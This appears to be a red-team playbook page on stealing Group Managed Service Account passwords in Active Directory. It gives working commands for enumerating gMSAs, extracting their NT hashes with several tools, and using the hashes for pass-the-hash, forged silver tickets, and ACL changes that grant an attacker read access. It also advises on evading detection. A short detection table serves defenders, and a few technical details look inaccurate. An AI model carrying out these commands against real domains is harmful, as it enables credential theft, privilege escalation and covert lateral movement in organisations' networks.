# gMSA & MSA Abuse

> **MITRE ATT&CK**: Credential Access > T1555 - Credentials from Password Stores
> **Platforms**: Windows
> **Required Privileges**: User (with read permissions on msDS-ManagedPassword)
> **OPSEC Risk**: Low-Medium

---

## Strategic Overview

Group Managed Service Accounts (gMSAs) were introduced to solve the problem of service account password management. They use automatically rotated, 256-character random passwords managed by Active Directory. Ironically, the mechanism that makes gMSAs more secure than traditional service accounts also creates a distinct attack path: any principal listed in `PrincipalsAllowedToRetrieveManagedPassword` can read the current password hash directly from the domain controller. Red Team Leads should understand gMSA abuse because these accounts frequently run critical services with elevated privileges, and the password retrieval operation is a legitimate AD function that blends well with normal activity -- making it a low-noise attack path.

---

## Technical Deep-Dive

### gMSA Architecture

```
Key Attributes:
- objectClass: msDS-GroupManagedServiceAccount
- msDS-ManagedPassword: BLOB containing current and previous NT hashes
- msDS-ManagedPasswordInterval: Rotation interval in days (default: 30)
- msDS-ManagedPasswordId: Current password ID / version
- PrincipalsAllowedToRetrieveManagedPassword: Who can read the password
- msDS-GroupMSAMembership: SDDL defining password retrieval access

Password derivation:
- KDS Root Key (stored in AD, created once per forest)
- Password is derived from: KDS Root Key + ManagedPasswordId + account SID
- Domain Controllers compute the password on-demand when queried
- Only DCs with the KDS Root Key can compute the password
```

### Standalone MSA vs gMSA

| Feature | MSA (sMSA) | gMSA |
|---|---|---|
| Introduced | Windows Server 2008 R2 | Windows Server 2012 |
| Scope | Single server | Multiple servers |
| Password management | DC manages, single host retrieves | DC manages, multiple hosts retrieve |
| Attack relevance | Lower (single-server scope) | Higher (broader access, more common) |

### Enumeration

```powershell
# Find all gMSA accounts using AD PowerShell module
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword, ServicePrincipalName, MemberOf, msDS-ManagedPasswordInterval
# Look for: what services they run (SPNs), what groups they belong to, who can read passwords

# PowerView enumeration
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)' -Properties samaccountname, msds-managedpasswordinterval, msds-groupmsamembership, serviceprincipalname, memberof
Get-DomainObject -LDAPFilter '(objectClass=msDS-ManagedServiceAccount)' -Properties samaccountname

# Identify who can read gMSA passwords
Get-ADServiceAccount -Identity svc_gmsa -Properties PrincipalsAllowedToRetrieveManagedPassword | Select-Object -ExpandProperty PrincipalsAllowedToRetrieveManagedPassword

# BloodHound: look for ReadGMSAPassword edges
# Query: MATCH p=(n)-[:ReadGMSAPassword]->(m:Base {objectclass: "msds-groupmanagedserviceaccount"}) RETURN p
# Also check: where gMSA accounts have admin rights
# MATCH p=(m:Base {objectclass: "msds-groupmanagedserviceaccount"})-[:AdminTo|MemberOf*1..]->(c:Computer) RETURN p

# Find gMSA accounts with interesting group memberships
Get-ADServiceAccount -Filter * -Properties MemberOf | Where-Object {$_.MemberOf -ne $null} | Select-Object Name, MemberOf

# Enumerate KDS Root Keys (requires Domain Admin or equivalent)
Get-KdsRootKey
```

### Password Extraction

```powershell
# Method 1: GMSAPasswordReader (C# tool, runs in-memory)
GMSAPasswordReader.exe --accountname svc_gmsa
# Returns: current and previous NT hashes

# Method 2: gMSADumper (Python, from Linux attack host)
python3 gMSADumper.py -u 'alloweduser' -p 'password' -d domain.local
# Or with hash:
python3 gMSADumper.py -u 'alloweduser' -H 'NTLM_HASH' -d domain.local

# Method 3: PowerShell native (must run as allowed principal)
$gmsa = Get-ADServiceAccount -Identity svc_gmsa -Properties msDS-ManagedPassword
$blob = $gmsa.'msDS-ManagedPassword'
$mp = New-Object Microsoft.ActiveDirectory.Management.ADManagedPasswordBlob($blob)
$hash = [System.BitConverter]::ToString($mp.CurrentPassword).Replace("-","")
# Convert to NT hash for Pass-the-Hash

# Method 4: DSInternals (offline or online)
# Online (requires appropriate permissions):
Get-ADDBAccount -SamAccountName 'svc_gmsa$' -DBPath 'C:\Windows\NTDS\ntds.dit' -BootKey $bootkey
# Or use DSInternals PowerShell module:
Install-Module DSInternals
$cred = Get-Credential  # Allowed principal credentials
Get-ADReplAccount -SamAccountName 'svc_gmsa$' -Server dc01.domain.local -Credential $cred

# Method 5: Impacket (from Linux)
python3 getNTHash.py -account 'svc_gmsa$' -targetuser 'alloweduser' -password 'password' domain.local/alloweduser

# Method 6: Manual LDAP query and blob parsing
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName=svc_gmsa$))"
$searcher.PropertiesToLoad.Add("msDS-ManagedPassword") | Out-Null
$result = $searcher.FindOne()
$blob = $result.Properties["msds-managedpassword"][0]
# Parse blob: bytes 16-32 = current password hash
```

### Post-Exploitation with gMSA Credentials

```powershell
# gMSA accounts often have elevated privileges:
# - Local admin on application servers
# - SQL Server sysadmin
# - IIS application pool identity with access to sensitive data
# - Backup operator rights
# - Service accounts for critical infrastructure

# Pass-the-Hash with extracted NT hash
crackmapexec smb target-servers.txt -u 'svc_gmsa$' -H '<NT_HASH>'
impacket-psexec 'domain.local/svc_gmsa$'@target.domain.local -hashes :<NT_HASH>
impacket-wmiexec 'domain.local/svc_gmsa$'@target.domain.local -hashes :<NT_HASH>

# Silver Ticket if gMSA has SPNs
# Extract gMSA hash, forge service ticket for the SPN it owns
Rubeus.exe silver /service:MSSQLSvc/sql01.domain.local:1433 /rc4:<GMSA_NT_HASH> /user:Administrator /domain:domain.local /sid:S-1-5-21-DOMAIN_SID /ptt

# Use gMSA for further AD enumeration
# gMSA may have rights that your compromised user does not
runas /netonly /user:domain.local\svc_gmsa$ cmd.exe  # Won't work (no interactive password)
# Instead, use Pass-the-Hash or overpass-the-hash with Rubeus:
Rubeus.exe asktgt /user:svc_gmsa$ /rc4:<NT_HASH> /domain:domain.local /ptt
```

### Abuse Scenarios and Attack Chains

```powershell
# Scenario 1: Compromise user in PrincipalsAllowedToRetrieveManagedPassword
# User compromise → gMSA password read → lateral movement to servers where gMSA is admin

# Scenario 2: ACL abuse to add yourself to PrincipalsAllowedToRetrieveManagedPassword
# Requires WriteDacl or GenericAll on the gMSA object
Set-ADServiceAccount -Identity svc_gmsa -PrincipalsAllowedToRetrieveManagedPassword @{Add="DOMAIN\attacker"}
# Or with PowerView:
Add-DomainObjectAcl -TargetIdentity svc_gmsa -PrincipalIdentity attacker -Rights All

# Scenario 3: gMSA-to-gMSA chain
# gMSA_A is allowed to read gMSA_B password
# gMSA_B has admin rights on critical servers
# Compromise entity that can read gMSA_A → read gMSA_B → access critical servers

# Scenario 4: Computer account in PrincipalsAllowedToRetrieveManagedPassword
# If a computer account can read the gMSA password, compromising that machine = gMSA access
# Common pattern: "Web Servers" group allowed to read gMSA for web app service account
```

---

## Detection & Evasion

### Detection Opportunities

| Indicator | Event / Source | Details |
|---|---|---|
| gMSA password read | Event 4662 (Directory Service Access) | Read of msDS-ManagedPassword attribute |
| Unusual gMSA authentication | Event 4624 | gMSA logon from unexpected source IP |
| ACL modification on gMSA | Event 5136 | Changes to PrincipalsAllowedToRetrieveManagedPassword |
| gMSA lateral movement | Event 4624 Type 3 | Network logon from gMSA to unusual targets |
| KDS Root Key access | Event 4662 | Read access to KDS Root Key objects |

### Evasion Techniques

```
- gMSA password reads are LEGITIMATE operations - any principal in the allowed
  list reads this attribute during normal service startup
- Perform reads from hosts that are already in PrincipalsAllowedToRetrieveManagedPassword
- Time operations to coincide with service restarts (when password reads are expected)
- Use the gMSA from servers where it normally authenticates (check service logs first)
- Avoid modifying PrincipalsAllowedToRetrieveManagedPassword (generates clear audit trail)
- Prefer extracting from memory on hosts where gMSA is already logged in over LDAP reads
```

### OPSEC Notes

- gMSA password reads do not trigger account lockouts (no failed attempts)
- The 256-character password makes Kerberoasting against gMSA SPNs impractical
- gMSA passwords survive password rotation if you extract the NT hash (hash-based attacks are password-independent)
- Some EDR solutions do not monitor for gMSA-specific abuse patterns

---

## Cross-References

- [ACL Abuse](../05-privilege-escalation/acl-abuse.md) - Modifying gMSA permissions
- [AD Enumeration](../08-discovery/ad-enumeration.md) - Finding gMSA accounts in the environment
- [Credential Stores](../07-credential-access/credential-stores.md) - Other credential extraction techniques
- [Pass-the-Hash](../06-lateral-movement/pass-the-hash.md) - Using extracted gMSA hashes
- [AD Fundamentals](ad-fundamentals.md) - Service account architecture

---

## References

- Microsoft: Group Managed Service Accounts Overview
- Cube0x0: gMSADumper tool and research
- Sean Metcalf (adsecurity.org): gMSA security considerations
- BloodHound documentation: ReadGMSAPassword edge
- DSInternals: Offline and online gMSA password extraction
- MITRE ATT&CK T1555 - Credentials from Password Stores
